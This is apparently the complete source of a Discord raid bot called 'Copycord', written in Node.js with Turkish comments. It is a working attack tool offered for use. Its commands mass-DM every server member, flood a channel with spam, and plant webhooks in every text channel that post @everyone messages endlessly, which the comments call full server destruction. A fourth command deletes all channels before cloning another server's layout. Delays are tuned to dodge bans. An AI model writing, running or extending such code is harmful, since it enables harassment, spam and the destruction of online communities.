require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

const OWNER_ID = "1389930042200559706";

// --- KOMUTLAR ---
const commands = [
    // DM RAID: Sunucudaki herkese sızar
    new SlashCommandBuilder()
        .setName('dm-raid')
        .setDescription('Sunucudaki herkese DM atar.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Mesaj içeriği').setRequired(true)),
    
    // ULTRA SPAM: Mevcut kanala mermi yağdırır
    new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Bulunduğun kanala izinli/izinsiz seri mesaj atar.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam metni').setRequired(true))
        .addIntegerOption(opt => opt.setName('adet').setDescription('Kaç adet?').setRequired(true)),

    // WEBHOOK RAID: Tüm kanalları patlatır
    new SlashCommandBuilder()
        .setName('raid')
        .setDescription('Tüm kanallara Webhook ile saldırır.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam içeriği').setRequired(true)),

    // COPYCORD CLONER
    new SlashCommandBuilder()
        .setName('kur')
        .setDescription('Copycord Altyapısı: Sunucuyu kopyalar.')
        .addStringOption(opt => opt.setName('id').setDescription('Kaynak ID').setRequired(true))
].map(c => c.toJSON());

client.once('ready', async () => {
    try {
        const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log(`☣️ COPYCORD SYSTEM LOADED: ${client.user.tag}`);
    } catch (error) {
        console.error("Komut yükleme hatası:", error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    // Sadece senin ID'n kullanabilir
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "❌ Yetkin yok kanka!", ephemeral: true });

    const { commandName, options, guild, channel } = interaction;

    // --- 1. DM RAID ---
    if (commandName === 'dm-raid') {
        const text = options.getString('mesaj');
        await interaction.reply({ content: "🚀 DM Operasyonu Başladı...", ephemeral: true });
        
        const members = await guild.members.fetch();
        for (const member of members.values()) {
            if (member.user.bot) continue;
            member.send(text).catch(() => console.log(`${member.user.tag} kapalı.`));
            await new Promise(r => setTimeout(r, 1200)); // Hızlı ama ban riskine karşı dengeli
        }
    }

    // --- 2. ULTRA SPAM (Normal Mesaj) ---
    if (commandName === 'spam') {
        const text = options.getString('mesaj');
        const count = options.getInteger('adet');
        await interaction.reply({ content: `🔥 ${count} adet mesaj gönderiliyor...`, ephemeral: true });

        for (let i = 0; i < count; i++) {
            try {
                await channel.send(text);
                await new Promise(r => setTimeout(r, 400)); // 0.4 saniye hız
            } catch (e) { break; }
        }
    }

    // --- 3. WEBHOOK RAID (Full Sunucu İmhası) ---
    if (commandName === 'raid') {
        const text = options.getString('mesaj');
        await interaction.reply({ content: "☣️ Webhooklar sızıyor...", ephemeral: true });

        const channels = await guild.channels.fetch();
        channels.filter(c => c.type === ChannelType.GuildText).forEach(async ch => {
            try {
                const wb = await ch.createWebhook({ name: 'Copycord Destroyer', avatar: client.user.displayAvatarURL() });
                setInterval(() => {
                    wb.send(`@everyone ${text}`).catch(() => {});
                }, 800);
            } catch (err) { console.log("Webhook oluşturulamadı: " + ch.name); }
        });
    }

    // --- 4. COPYCORD CLONER ---
    if (commandName === 'kur') {
        const srcId = options.getString('id');
        const src = client.guilds.cache.get(srcId);
        if (!src) return interaction.reply("Kaynak bulunamadı!");

        await interaction.reply("🏗️ Yapı kopyalanıyor...");
        
        const currentChans = await guild.channels.fetch();
        for (const c of currentChans.values()) await c.delete().catch(() => {});

        const srcChans = await src.channels.fetch();
        const categories = srcChans.filter(c => c.type === ChannelType.GuildCategory).sort((a, b) => a.position - b.position);

        for (const cat of categories.values()) {
            const newCat = await guild.channels.create({ name: cat.name, type: ChannelType.GuildCategory });
            const children = srcChans.filter(c => c.parentId === cat.id).sort((a, b) => a.position - b.position);
            for (const ch of children.values()) {
                await guild.channels.create({ name: ch.name, type: ch.type, parent: newCat.id });
                await new Promise(r => setTimeout(r, 800));
            }
        }
    }
});

// Render'da uyumaması için port dinleyici
http.createServer((req, res) => res.end("Copycord System Online")).listen(process.env.PORT || 3000);

client.login(process.env.DISCORD_BOT_TOKEN);
